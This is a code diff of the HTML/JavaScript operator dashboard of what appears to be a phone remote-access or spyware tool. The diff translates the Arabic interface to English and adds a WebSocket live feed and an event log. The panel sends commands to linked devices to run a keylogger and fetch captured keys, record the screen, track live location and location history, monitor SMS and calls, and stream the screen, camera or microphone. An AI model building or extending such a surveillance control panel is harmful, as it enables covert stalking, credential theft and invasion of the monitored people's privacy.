 <div class="card"><h3>Monitor Controls</h3>
-<select id="monDevice" style="width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px"></select>
+<select id="monDevice" style="width:100%;padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px"></select>
 <div class="cmd-grid">
-<button class="cmd-btn" onclick="sendMonCmd('keylogger_start')">⌨️ Start Keylogger</button>
-<button class="cmd-btn" onclick="sendMonCmd('keylogger_stop')">⏹ Stop Keylogger</button>
-<button class="cmd-btn" onclick="sendMonCmd('get_keylogger')">📥 Get Keys</button>
-<button class="cmd-btn" onclick="sendMonCmd('screen_record_start')">🔴 Start Screen Record</button>
-<button class="cmd-btn" onclick="sendMonCmd('screen_record_stop')">⏹ Stop Screen Record</button>
-<button class="cmd-btn" onclick="sendMonCmd('location_live')">🗺️ Live Location</button>
-<button class="cmd-btn" onclick="sendMonCmd('location_stop')">⏹ Stop Tracking</button>
-<button class="cmd-btn" onclick="sendMonCmd('location_history')">📜 Location History</button>
-<button class="cmd-btn" onclick="sendMonCmd('sms_monitor')">📲 SMS Monitor</button>
-<button class="cmd-btn" onclick="sendMonCmd('call_monitor')">📞 Call Monitor</button>
+  <button class="cmd-btn" onclick="sendMonCmd('keylogger_start')">&#x2328;&#xFE0F; Start Keylogger</button>
+  <button class="cmd-btn" onclick="sendMonCmd('keylogger_stop')">&#x23F9; Stop Keylogger</button>
+  <button class="cmd-btn" onclick="sendMonCmd('get_keylogger')">&#x1F4E5; Get Keys</button>
+  <button class="cmd-btn" onclick="sendMonCmd('screen_record_start')">&#x1F534; Start Screen Record</button>
+  <button class="cmd-btn" onclick="sendMonCmd('screen_record_stop')">&#x23F9; Stop Screen Record</button>
+  <button class="cmd-btn" onclick="sendMonCmd('location_live')">&#x1F5FA;&#xFE0F; Live Location</button>
+  <button class="cmd-btn" onclick="sendMonCmd('location_stop')">&#x23F9; Stop Tracking</button>
+  <button class="cmd-btn" onclick="sendMonCmd('location_history')">&#x1F4DC; Location History</button>
+  <button class="cmd-btn" onclick="sendMonCmd('sms_monitor')">&#x1F4F2; SMS Monitor</button>
+  <button class="cmd-btn" onclick="sendMonCmd('call_monitor')">&#x1F4DE; Call Monitor</button>
 </div></div>
 </div>
 
+<!-- ====== Events Page ====== -->
+<div class="page" id="page-events">
+<div class="topbar">
+  <h1>&#x1F4CB; Event Log</h1>
+  <button class="btn btn-secondary btn-sm" onclick="loadEvents()">&#x1F504; Refresh</button>
+</div>
+<div class="filter-bar">
+  <span class="filter-label">Device:</span>
+  <select id="eventDeviceFilter" onchange="filterEventLog()"><option value="all">All Devices</option></select>
+  <span class="filter-label">Type:</span>
+  <select id="eventTypeFilter" onchange="filterEventLog()">
+    <option value="all">All Types</option>
+    <option value="security">Security</option>
+    <option value="info">Info</option>
+    <option value="warning">Warning</option>
+    <option value="success">Success</option>
+  </select>
+  <span class="filter-label">Date:</span>
+  <input type="date" id="eventDateFilter" onchange="filterEventLog()" style="max-width:160px">
+</div>
+<div class="auto-scroll-bar">
+  <label><input type="checkbox" id="eventAutoScroll" checked> Auto-scroll to latest</label>
+</div>
+<div class="table-wrap">
+  <table>
+    <thead><tr>
+      <th>Time</th><th>Device</th><th>Type</th><th>Event</th><th>Details</th>
+    </tr></thead>
+    <tbody id="eventLogBody"></tbody>
+  </table>
+</div>
+<div id="eventLogEmpty" class="empty" style="display:none">
+  <div class="empty-icon">&#x1F4ED;</div>No events found
+</div>
+</div>
+
+<!-- ====== Streaming Page ====== -->
 <div class="page" id="page-streaming">
-<div class="topbar"><h1>📡 البث المباشر</h1></div>
+<div class="topbar"><h1>&#x1F4E1; Live Stream</h1></div>
 <div class="stream-layout">
 <div class="stream-controls">
-<div class="card" style="margin-bottom:0">
-<h3>📱 اختر الجهاز</h3>
-<select id="streamDevice" style="width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px" onchange="onStreamDeviceChange()"></select>
-</div>
-<div class="card" style="margin-bottom:0">
-<h3>🎬 نوع البث</h3>
-<div class="stream-type-grid">
-<button class="stream-type-btn active" id="stScreen" onclick="selectStreamType('screen')">
-<span class="st-icon">🖥️</span>الشاشة
-</button>
-<button class="stream-type-btn" id="stCamera" onclick="selectStreamType('camera')">
-<span class="st-icon">📷</span>الكاميرا
-</button>
-<button class="stream-type-btn" id="stAudio" onclick="selectStreamType('audio')">
-<span class="st-icon">🎙️</span>الصوت
-</button>
-</div>
-</div>
-<div class="card" style="margin-bottom:0">
-<h3>⚙️ التحكم</h3>
-<div class="stream-actions">
-<button class="btn btn-primary" id="btnStartStream" onclick="startStream()">▶️ بدء البث</button>
-<button class="btn btn-danger" id="btnStopStream" onclick="stopStream()" style="display:none">⏹ إيقاف البث</button>
-<button class="btn btn-secondary" id="btnSwitchCam" onclick="switchCamera()" style="display:none">🔄 تبديل الكاميرا</button>
-</div>
-</div>
-<div class="card" style="margin-bottom:0" id="qualityCard">
-<h3>📊 الجودة</h3>
-<div class="stream-quality">
-<button class="active" onclick="setQuality('low',this)">SD</button>
-<button onclick="setQuality('medium',this)">HD</button>
-<button onclick="setQuality('high',this)">FHD</button>
-</div>
-</div>
-<div class="card" style="margin-bottom:0">
-<h3>ℹ️ حالة البث</h3>
-<div class="stream-info" id="streamInfoPanel">
-<div><span>الحالة</span><span id="stStatus">متوقف</span></div>
-<div><span>النوع</span><span id="stType">-</span></div>
-<div><span>الجهاز</span><span id="stDevice">-</span></div>
-<div><span>الإطارات</span><span id="stFrames">0</span></div>
-<div><span>آخر نشاط</span><span id="stLastAct">-</span></div>
-</div>
-</div>
+  <div class="card" style="margin-bottom:0">
+    <h3>Device</h3>
+    <select id="streamDevice" style="width:100%;padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:0" onchange="onStreamDeviceChange()"></select>
+  </div>
+  <div class="card" style="margin-bottom:0">
+    <h3>Stream Type</h3>
+    <div class="stream-type-grid">
+      <button class="stream-type-btn active" id="stScreen" onclick="selectStreamType('screen')">
+        <span class="st-icon">&#x1F5A5;&#xFE0F;</span>Screen
+      </button>
+      <button class="stream-type-btn" id="stCamera" onclick="selectStreamType('camera')">
+        <span class="st-icon">&#x1F4F7;</span>Camera
+      </button>
+      <button class="stream-type-btn" id="stAudio" onclick="selectStreamType('audio')">
+        <span class="st-icon">&#x1F399;&#xFE0F;</span>Audio
+      </button>
+    </div>
+  </div>
+  <div class="card" style="margin-bottom:0">
+    <h3>Controls</h3>
+    <div class="stream-actions">
+      <button class="btn btn-primary" id="btnStartStream" onclick="startStream()">&#x25B6; Start Stream</button>
+      <button class="btn btn-danger" id="btnStopStream" onclick="stopStream()" style="display:none">&#x23F9; Stop Stream</button>
+      <button class="btn btn-secondary" id="btnSwitchCam" onclick="switchCamera()" style="display:none">&#x1F504; Switch Camera</button>
+    </div>
+  </div>
+  <div class="card" style="margin-bottom:0" id="qualityCard">
+    <h3>Quality</h3>
+    <div class="stream-quality">
+      <button class="active" onclick="setQuality('low',this)">SD</button>
+      <button onclick="setQuality('medium',this)">HD</button>
+      <button onclick="setQuality('high',this)">FHD</button>
+    </div>
+  </div>
+  <div class="card" style="margin-bottom:0">
+    <h3>Stream Info</h3>
+    <div class="stream-info" id="streamInfoPanel">
+      <div><span>Status</span><span id="stStatus">Stopped</span></div>
+      <div><span>Type</span><span id="stType">-</span></div>
+      <div><span>Device</span><span id="stDevice">-</span></div>
+      <div><span>Frames</span><span id="stFrames">0</span></div>
+      <div><span>Last Activity</span><span id="stLastAct">-</span></div>
+    </div>
+  </div>
 </div>
 <div>
-<div class="stream-viewer" id="streamViewer">
-<div class="no-stream" id="noStreamMsg">
-<div style="font-size:48px;margin-bottom:12px">📡</div>
-اختر جهازاً وابدأ البث المباشر
-</div>
-<img id="streamImg" style="display:none" alt="stream">
-<div class="stream-badge" id="streamBadge" style="display:none">LIVE</div>
-</div>
-<div id="audioPlayerContainer" style="display:none;margin-top:12px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px">
-<div style="display:flex;align-items:center;gap:12px;margin-bottom:8px">
-<span style="font-size:20px">🎙️</span>
-<span style="font-weight:600">بث الصوت المباشر</span>
-<span class="badge badge-green" id="audioLiveBadge">LIVE</span>
-</div>
-<div class="audio-bars" id="audioBars"></div>
-<audio id="streamAudio" autoplay style="width:100%;margin-top:8px"></audio>
-</div>
+  <div class="stream-viewer" id="streamViewer">
+    <div class="no-stream" id="noStreamMsg">
+      <div style="font-size:48px;margin-bottom:12px">&#x1F4E1;</div>
+      Select a device and start streaming
+    </div>
+    <img id="streamImg" style="display:none" alt="stream">
+    <div class="stream-badge" id="streamBadge" style="display:none">LIVE</div>
+  </div>
+  <div id="audioPlayerContainer" style="display:none;margin-top:12px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:8px">
+      <span style="font-size:20px">&#x1F399;&#xFE0F;</span>
+      <span style="font-weight:600">Live Audio Stream</span>
+      <span class="badge badge-green" id="audioLiveBadge">LIVE</span>
+    </div>
+    <div class="audio-bars" id="audioBars"></div>
+    <audio id="streamAudio" autoplay style="width:100%;margin-top:8px"></audio>
+  </div>
 </div>
 </div>
 </div>
 
+<!-- ====== Settings Page ====== -->
 <div class="page" id="page-settings">
-<div class="topbar"><h1>⚙️ Settings</h1></div>
+<div class="topbar"><h1>&#x2699;&#xFE0F; Settings</h1></div>
 <div class="card"><h3>Server Settings</h3>
 <div id="settingsForm"></div>
-<button class="btn btn-primary" onclick="saveSettings()" style="margin-top:12px">💾 Save</button></div>
-</div>
-
-<div class="page" id="page-logs">
-<div class="topbar"><h1>📝 Event Logs</h1><button class="btn btn-secondary btn-sm" onclick="loadEvents()">🔄 Refresh</button></div>
-<div class="card"><div id="eventLog"></div></div>
+<button class="btn btn-primary" onclick="saveSettings()" style="margin-top:12px">&#x1F4BE; Save</button></div>
 </div>
 
 </div></div>
@@ -2997,398 +3658,685 @@ th{color:var(--text2);font-weight:500}
 <div class="notification" id="notif"></div>
 
 <script>
+/* ========== Utilities ========== */
 function esc(s){
-if(s==null)return '';
-return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+  if(s==null)return '';
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
 }
-let TOKEN=localStorage.getItem('az_token')||'';
-let POLL_INTERVAL=null;
-let DEVICES=[];
-
-function notify(msg,color='var(--green)'){
-const n=document.getElementById('notif');
-n.textContent=msg;n.style.borderColor=color;n.classList.add('show');
-setTimeout(()=>n.classList.remove('show'),3000);
+function relativeTime(dateStr){
+  if(!dateStr)return '';
+  try{
+    var d=new Date(dateStr);
+    if(isNaN(d.getTime()))return dateStr;
+    var now=Date.now();
+    var diff=Math.floor((now-d.getTime())/1000);
+    if(diff<0)diff=0;
+    if(diff<10)return 'just now';
+    if(diff<60)return diff+'s ago';
+    if(diff<3600)return Math.floor(diff/60)+'m ago';
+    if(diff<86400)return Math.floor(diff/3600)+'h ago';
+    if(diff<604800)return Math.floor(diff/86400)+'d ago';
+    return d.toLocaleDateString();
+  }catch(e){return dateStr;}
 }
 
-function api(path,opts={}){
-return fetch('/api/'+path,{
-headers:{'Content-Type':'application/json',...(TOKEN?{'Authorization':'Bearer '+TOKEN}:{})},
-...opts
-}).then(r=>r.json());
+/* ========== State ========== */
+var TOKEN=localStorage.getItem('az_token')||'';
+var POLL_INTERVAL=null;
+var DEVICES=[];
+var ALL_COMMANDS=[];
+var ALL_EVENTS=[];
+var PENDING_REFRESH=null;
+
+/* ========== Notification ========== */
+function notify(msg,color){
+  color=color||'var(--green)';
+  var n=document.getElementById('notif');
+  n.innerHTML='<span style="color:'+color+';font-size:16px">&#x2713;</span> '+esc(msg);
+  n.style.borderColor=color;
+  n.classList.add('show');
+  clearTimeout(n._t);
+  n._t=setTimeout(function(){n.classList.remove('show');},3000);
 }
 
+/* ========== API ========== */
+function api(path,opts){
+  opts=opts||{};
+  return fetch('/api/'+path,{
+    headers:{'Content-Type':'application/json',...(TOKEN?{'Authorization':'Bearer '+TOKEN}:{})},
+    ...opts
+  }).then(function(r){return r.json();});
+}
+
+/* ========== Auth ========== */
 async function doLogin(){
-const u=document.getElementById('loginUser').value;
-const p=document.getElementById('loginPass').value;
-const r=await api('login',{method:'POST',body:JSON.stringify({username:u,password:p})});
-if(r.ok){TOKEN=r.token;localStorage.setItem('az_token',TOKEN);showApp();}
-else{document.getElementById('loginError').style.display='block';}
+  var u=document.getElementById('loginUser').value;
+  var p=document.getElementById('loginPass').value;
+  var r=await api('login',{method:'POST',body:JSON.stringify({username:u,password:p})});
+  if(r.ok){TOKEN=r.token;localStorage.setItem('az_token',TOKEN);showApp();}
+  else{document.getElementById('loginError').style.display='block';}
 }
-
 function doLogout(){
-try{api('web/logout',{method:'POST'});}catch(e){}
-TOKEN='';localStorage.removeItem('az_token');
-document.getElementById('app').style.display='none';
-document.getElementById('loginPage').style.display='flex';
-if(POLL_INTERVAL)clearInterval(POLL_INTERVAL);
+  try{api('web/logout',{method:'POST'});}catch(e){}
+  TOKEN='';localStorage.removeItem('az_token');
+  document.getElementById('app').style.display='none';
+  document.getElementById('loginPage').style.display='flex';
+  if(POLL_INTERVAL)clearInterval(POLL_INTERVAL);
+  if(ws&&ws.readyState<2)ws.close();
 }
-
 function showApp(){
-document.getElementById('loginPage').style.display='none';
-document.getElementById('app').style.display='block';
-loadAll();
-POLL_INTERVAL=setInterval(loadAll,5000);
+  document.getElementById('loginPage').style.display='none';
+  document.getElementById('app').style.display='block';
+  loadAll();
+  connectWS();
+  POLL_INTERVAL=setInterval(loadAll,8000);
 }
 
-function toggleSidebar(){document.getElementById('sidebar').classList.toggle('open');}
-
-function showPage(name,event){
-document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
-document.getElementById('page-'+name).classList.add('active');
-document.querySelectorAll('.sidebar a').forEach(a=>a.classList.remove('active'));
-if(event&&event.target)event.target.classList.add('active');
-document.getElementById('sidebar').classList.remove('open');
+/* ========== Sidebar ========== */
+function toggleSidebar(){
+  document.getElementById('sidebar').classList.toggle('open');
+  document.getElementById('sidebarOverlay').classList.toggle('open');
+}
+function showPage(name,el){
+  document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active');});
+  document.getElementById('page-'+name).classList.add('active');
+  document.querySelectorAll('.sidebar a[data-page]').forEach(function(a){a.classList.remove('active');});
+  if(el)el.classList.add('active');
+  else{
+    var link=document.querySelector('.sidebar a[data-page="'+name+'"]');
+    if(link)link.classList.add('active');
+  }
+  document.getElementById('sidebar').classList.remove('open');
+  document.getElementById('sidebarOverlay').classList.remove('open');
 }
 
+/* ========== Clock ========== */
 function updateClock(){
-const now=new Date();
-document.getElementById('clock').textContent=now.toLocaleString('ar-SA');
+  var now=new Date();
+  document.getElementById('clock').textContent=now.toLocaleString('ar-SA');
 }
 setInterval(updateClock,1000);updateClock();
 
+/* ========== WebSocket ========== */
+var ws=null;
+var wsReconnectDelay=1000;
+var wsMaxDelay=30000;
+function connectWS(){
+  if(!TOKEN)return;
+  try{
+    var proto=location.protocol==='https:'?'wss:':'ws:';
+    ws=new WebSocket(proto+'//'+location.host+'/ws/dashboard?token='+encodeURIComponent(TOKEN));
+    ws.onopen=function(){
+      wsReconnectDelay=1000;
+      setWSStatus('connected');
+    };
+    ws.onmessage=function(ev){
+      try{
+        var msg=JSON.parse(ev.data);
+        handleWSMessage(msg);
+      }catch(e){}
+    };
+    ws.onclose=function(){
+      setWSStatus('disconnected');
+      wsReconnectDelay=Math.min(wsReconnectDelay*1.5,wsMaxDelay);
+      setTimeout(connectWS,wsReconnectDelay);
+    };
+    ws.onerror=function(){
+      ws.close();
+    };
+  }catch(e){
+    setTimeout(connectWS,wsReconnectDelay);
+  }
+}
+function setWSStatus(status){
+  var ind=document.getElementById('wsIndicator');
+  var txt=document.getElementById('wsStatusText');
+  ind.className='live-indicator';
+  if(status==='connected'){ind.classList.remove('offline','connecting');txt.textContent='Live';}
+  else if(status==='disconnected'){ind.classList.add('offline');txt.textContent='Offline';}
+  else{ind.classList.add('connecting');txt.textContent='Connecting';}
+}
+function handleWSMessage(msg){
+  if(msg.type==='device_update'){
+    var dev=msg.device;
+    var idx=DEVICES.findIndex(function(d){return d.id===dev.id;});
+    if(idx>=0){DEVICES[idx]=dev;}
+    else{DEVICES.push(dev);}
+    populateDeviceSelects();
+    renderDevices();
+    updateDashDevices();
+  }
+  else if(msg.type==='device_online'){notify(msg.device_name+' came online','var(--green)');loadAll();}
+  else if(msg.type==='device_offline'){notify(msg.device_name+' went offline','var(--red)');loadAll();}
+  else if(msg.type==='command_update'){
+    var ci=ALL_COMMANDS.findIndex(function(c){return c.id===msg.command.id;});
+    if(ci>=0)ALL_COMMANDS[ci]=msg.command;
+    else ALL_COMMANDS.push(msg.command);
+    renderCommandLog(ALL_COMMANDS);
+    checkPendingRefresh();
+  }
+  else if(msg.type==='new_event'){
+    ALL_EVENTS.push(msg.event);
+    if(ALL_EVENTS.length>500)ALL_EVENTS=ALL_EVENTS.slice(-500);
+    renderEventLog(ALL_EVENTS);
+    populateEventDeviceFilter();
+  }
+  else if(msg.type==='stats_update'){
+    renderStats(msg.stats);
+  }
+}
+
+/* ========== Populate Selects ========== */
 function populateDeviceSelects(){
-const html=DEVICES.map(d=>`<option value="${esc(d.id)}">${esc(d.name||d.id)} (${d.active?'🟢':'🔴'})</option>`).join('');
-['cmdDevice','fileDevice','dataDevice','monDevice','streamDevice'].forEach(id=>{
-const el=document.getElementById(id);if(el)el.innerHTML=html;
-});
+  var html=DEVICES.map(function(d){return '<option value="'+esc(d.id)+'">'+esc(d.name||d.id)+' ('+(d.active?'Online':'Offline')+')</option>';}).join('');
+  ['cmdDevice','fileDevice','dataDevice','monDevice','streamDevice'].forEach(function(id){
+    var el=document.getElementById(id);if(el)el.innerHTML=html;
+  });
+  populateEventDeviceFilter();
+}
+function populateEventDeviceFilter(){
+  var sel=document.getElementById('eventDeviceFilter');
+  if(!sel)return;
+  var cur=sel.value;
+  var html='<option value="all">All Devices</option>';
+  DEVICES.forEach(function(d){html+='<option value="'+esc(d.id)+'">'+esc(d.name||d.id)+'</option>';});
+  sel.innerHTML=html;
+  sel.value=cur;
 }
 
+/* ========== Load All ========== */
 async function loadAll(){
-try{const r=await api('web/stats');if(r.ok)renderStats(r.stats);}catch(e){}
-try{const r=await api('web/devices');if(r.ok){DEVICES=r.devices||[];populateDeviceSelects();renderDevices();}}catch(e){}
-try{const r=await api('web/commands');if(r.ok)renderCommandLog(r.commands);}catch(e){}
-loadEvents();
-loadSettings();
+  try{var r=await api('web/stats');if(r.ok)renderStats(r.stats);}catch(e){}
+  try{var r=await api('web/devices');if(r.ok){DEVICES=r.devices||[];populateDeviceSelects();renderDevices();updateDashDevices();}}catch(e){}
+  try{var r=await api('web/commands');if(r.ok){ALL_COMMANDS=r.commands||[];renderCommandLog(ALL_COMMANDS);checkPendingRefresh();}}catch(e){}
+  loadEvents();
+  loadSettings();
 }
 
+/* ========== Stats Cards ========== */
 function renderStats(s){
-const grid=document.getElementById('statsGrid');
-grid.innerHTML=`
-<div class="stat-card"><div class="label">⏱ Uptime</div><div class="value">${esc(s.uptime_formatted||'-')}</div></div>
-<div class="stat-card"><div class="label">📱 Devices</div><div class="value" style="color:var(--blue)">${esc(s.devices_total)}</div><div class="sub">🟢 ${esc(s.devices_online)} online</div></div>
-<div class="stat-card"><div class="label">📋 Commands</div><div class="value" style="color:var(--yellow)">${esc(s.total_registered_commands)}</div><div class="sub">⏳ ${esc(s.commands_pending)} pending</div></div>
-<div class="stat-card"><div class="label">📨 Messages</div><div class="value" style="color:var(--purple)">${esc(s.messages_sent)}</div></div>
-<div class="stat-card"><div class="label">📡 API</div><div class="value">${esc(s.api_hits)}</div><div class="sub">hits</div></div>
-<div class="stat-card"><div class="label">✅ Completed</div><div class="value" style="color:var(--green)">${esc(s.commands_completed)}</div></div>`;
+  var eventsToday=0;
+  var now=new Date();var todayStr=now.toISOString().slice(0,10);
+  ALL_EVENTS.forEach(function(ev){if((ev.time||'').slice(0,10)===todayStr)eventsToday++;});
+  var grid=document.getElementById('statsGrid');
+  grid.innerHTML=
+  '<div class="stat-card"><div class="stat-icon blue">&#x1F4F1;</div><div class="label">Total Devices</div><div class="value" style="color:var(--blue)">'+esc(s.devices_total)+'</div><div class="sub">&#x1F7E2; '+esc(s.devices_online)+' online</div></div>'+
+  '<div class="stat-card"><div class="stat-icon green">&#x26A1;</div><div class="label">Online Devices</div><div class="value" style="color:var(--green)">'+esc(s.devices_online)+'</div><div class="sub">of '+esc(s.devices_total)+' total</div></div>'+
+  '<div class="stat-card"><div class="stat-icon yellow">&#x23F3;</div><div class="label">Pending Commands</div><div class="value" style="color:var(--yellow)">'+esc(s.commands_pending)+'</div><div class="sub">'+esc(s.total_registered_commands)+' registered</div></div>'+
+  '<div class="stat-card"><div class="stat-icon purple">&#x1F4CB;</div><div class="label">Events Today</div><div class="value" style="color:var(--purple)">'+eventsToday+'</div><div class="sub">'+esc(s.events_total)+' total events</div></div>'+
+  '<div class="stat-card"><div class="stat-icon orange">&#x2709;&#xFE0F;</div><div class="label">Messages Sent</div><div class="value" style="color:var(--orange)">'+esc(s.messages_sent)+'</div></div>'+
+  '<div class="stat-card"><div class="stat-icon green">&#x2705;</div><div class="label">Commands Done</div><div class="value" style="color:var(--green)">'+esc(s.commands_completed)+'</div><div class="sub">&#x1F4E1; '+esc(s.api_hits)+' API hits</div></div>'+
+  '<div class="stat-card"><div class="stat-icon blue">&#x23F1;</div><div class="label">Uptime</div><div class="value" style="font-size:18px;color:var(--blue)">'+esc(s.uptime_formatted||'-')+'</div></div>';
 }
 
+/* ========== Device Cards ========== */
+function batteryClass(pct){
+  pct=parseInt(pct)||0;
+  if(pct>50)return 'high';
+  if(pct>20)return 'mid';
+  return 'low';
+}
+function batteryColor(pct){
+  pct=parseInt(pct)||0;
+  if(pct>50)return 'var(--green)';
+  if(pct>20)return 'var(--yellow)';
+  return 'var(--red)';
+}
+function signalBarsHtml(strength){
+  var s=parseInt(strength)||0;
+  var bars=4;
+  if(s<25)bars=1;else if(s<50)bars=2;else if(s<75)bars=3;
+  var html='<div class="signal-bars">';
+  for(var i=1;i<=4;i++)html+='<div class="bar'+(i<=bars?' active':'')+'"></div>';
+  html+='</div>';
+  return html;
+}
+function deviceCardHtml(d){
+  var isOn=!!d.active;
+  var batt=parseInt(d.battery)||null;
+  var battHtml=batt!==null?'<div class="battery-bar"><div class="battery-shell"><div class="battery-fill '+batteryClass(batt)+'" style="width:'+Math.max(0,Math.min(100,batt))+'%"></div></div><span class="battery-text" style="color:'+batteryColor(batt)+'">'+batt+'%</span></div>':'';
+  var sigHtml=d.signal?signalBarsHtml(d.signal):'';
+  return '<div class="device-card" onclick="showDeviceDetail(\''+esc(d.id)+'\')">'+
+    '<div class="dc-header">'+
+      '<div class="dc-status '+(isOn?'online':'offline')+'"></div>'+
+      '<div class="dc-name">'+esc(d.name||d.id)+'</div>'+
+    '</div>'+
+    '<div class="dc-model">'+esc(d.model||'Unknown Model')+(d.os?' | '+esc(d.os):'')+'</div>'+
+    '<div class="dc-meta">'+
+      (battHtml?'<div class="meta-item"><span class="meta-icon">&#x1F50B;</span>'+battHtml+'</div>':'')+
+      (sigHtml?'<div class="meta-item"><span class="meta-icon">&#x1F4F6;</span>'+sigHtml+'</div>':'')+
+      '<div class="meta-item"><span class="meta-icon">&#x1F552;</span><span class="relative-time">'+relativeTime(d.last_seen)+'</span></div>'+
+      (d.network?'<div class="meta-item"><span class="meta-icon">&#x1F310;</span>'+esc(d.network)+'</div>':'')+
+    '</div>'+
+  '</div>';
+}
 function renderDevices(){
-const el=document.getElementById('deviceList');
-const dash=document.getElementById('dashDevices');
-if(!DEVICES.length){
-el.innerHTML='<div class="empty">No devices linked</div>';
-dash.innerHTML='<div class="empty">No devices</div>';
-return;
+  var filtered=filterDevicesList(DEVICES);
+  var el=document.getElementById('deviceList');
+  if(!filtered.length){el.innerHTML='<div class="empty"><div class="empty-icon">&#x1F4F1;</div>No devices found</div>';return;}
+  el.innerHTML=filtered.map(deviceCardHtml).join('');
 }
-const card=d=>`
-<div class="device-card" onclick="showDeviceDetail('${esc(d.id)}')">
-<div class="name">${d.active?'🟢':'🔴'} ${esc(d.name||d.id)}</div>
-<div class="meta">Model: ${esc(d.model||'-')} | OS: ${esc(d.os||'-')}</div>
-<div class="meta">Battery: ${esc(d.battery||'-')}% | Last: ${esc(d.last_seen||'-')}</div>
-</div>`;
-el.innerHTML=DEVICES.map(card).join('');
-dash.innerHTML=DEVICES.slice(0,4).map(card).join('');
+function updateDashDevices(){
+  var dash=document.getElementById('dashDevices');
+  if(!DEVICES.length){dash.innerHTML='<div class="empty">No devices</div>';return;}
+  dash.innerHTML=DEVICES.filter(function(d){return d.active;}).slice(0,6).map(deviceCardHtml).join('');
+}
+function filterDevices(){
+  renderDevices();
+}
+function filterDevicesList(devices){
+  var q=(document.getElementById('deviceSearch').value||'').toLowerCase();
+  var statusF=document.getElementById('deviceStatusFilter').value;
+  return devices.filter(function(d){
+    if(statusF==='online'&&!d.active)return false;
+    if(statusF==='offline'&&d.active)return false;
+    if(q){
+      var text=(d.name||' '+d.id+' '+d.model+' '+d.os).toLowerCase();
+      if(text.indexOf(q)<0)return false;
+    }
+    return true;
+  });
 }
 
+/* ========== Device Detail ========== */
 async function showDeviceDetail(id){
-try{
-const r=await api('web/device/'+id);
-if(!r.ok)return;
-const d=r.device;const cmds=r.commands||[];
-const detail=document.getElementById('deviceDetail');
-detail.style.display='block';
-detail.innerHTML=`
-<h2>📱 ${esc(d.name||d.id)}</h2>
-<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:16px 0">
-<div><span style="color:var(--text2)">ID:</span> <code>${esc(d.id)}</code></div>
-<div><span style="color:var(--text2)">Status:</span> ${d.active?'<span class="badge badge-green">Online</span>':'<span class="badge badge-red">Offline</span>'}</div>
-<div><span style="color:var(--text2)">Model:</span> ${esc(d.model||'-')}</div>
-<div><span style="color:var(--text2)">OS:</span> ${esc(d.os||'-')}</div>
-<div><span style="color:var(--text2)">Battery:</span> ${esc(d.battery||'-')}%</div>
-<div><span style="color:var(--text2)">Network:</span> ${esc(d.network||'-')}</div>
-<div><span style="color:var(--text2)">Location:</span> ${esc(d.location||'-')}</div>
-<div><span style="color:var(--text2)">Last Seen:</span> ${esc(d.last_seen||'-')}</div>
-</div>
-<h3>📋 Recent Commands</h3>
-${cmds.length?cmds.map(c=>`<div class="cmd-item"><div class="cmd-header"><span>${esc(c.command)}</span><span class="badge badge-${c.status==='completed'?'green':c.status==='pending'?'yellow':'blue'}">${esc(c.status)}</span></div><div style="color:var(--text2);font-size:12px">${esc(c.created_at)} | ID: ${esc(c.id)}</div></div>`).join(''):'<div class="empty">No commands</div>'}
-<button class="btn btn-danger btn-sm" onclick="unlinkDevice('${esc(d.id)}')" style="margin-top:16px">🗑️ Unlink Device</button>`;
-detail.scrollIntoView({behavior:'smooth'});
-}catch(e){}
+  try{
+    var r=await api('web/device/'+id);
+    if(!r.ok)return;
+    var d=r.device;var cmds=r.commands||[];
+    var detail=document.getElementById('deviceDetail');
+    detail.style.display='block';
+    var batt=parseInt(d.battery)||null;
+    var battHtml=batt!==null?'<span style="color:'+batteryColor(batt)+';font-weight:600">'+batt+'%</span> '+
+      '<div class="battery-bar" style="display:inline-flex;vertical-align:middle;margin-right:8px"><div class="battery-shell"><div class="battery-fill '+batteryClass(batt)+'" style="width:'+Math.max(0,Math.min(100,batt))+'%"></div></div></div>':'-';
+    detail.innerHTML=
+      '<div style="display:flex;align-items:center;gap:12px;margin-bottom:16px">'+
+        '<div class="dc-status '+(d.active?'online':'offline')+'" style="width:14px;height:14px"></div>'+
+        '<h2 style="font-size:20px">'+esc(d.name||d.id)+'</h2>'+
+        (d.active?'<span class="badge badge-green">Online</span>':'<span class="badge badge-red">Offline</span>')+
+      '</div>'+
+      '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-bottom:20px">'+
+        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">DEVICE ID</div><code style="font-size:12px">'+esc(d.id)+'</code></div>'+
+        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">MODEL</div><div>'+esc(d.model||'-')+'</div></div>'+
+        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">OS</div><div>'+esc(d.os||'-')+'</div></div>'+
+        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">BATTERY</div><div>'+battHtml+'</div></div>'+
+        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">NETWORK</div><div>'+esc(d.network||'-')+'</div></div>'+
+        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">LOCATION</div><div>'+esc(d.location||'-')+'</div></div>'+
+        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">LAST SEEN</div><div>'+esc(d.last_seen||'-')+' <span class="relative-time">('+relativeTime(d.last_seen)+')</span></div></div>'+
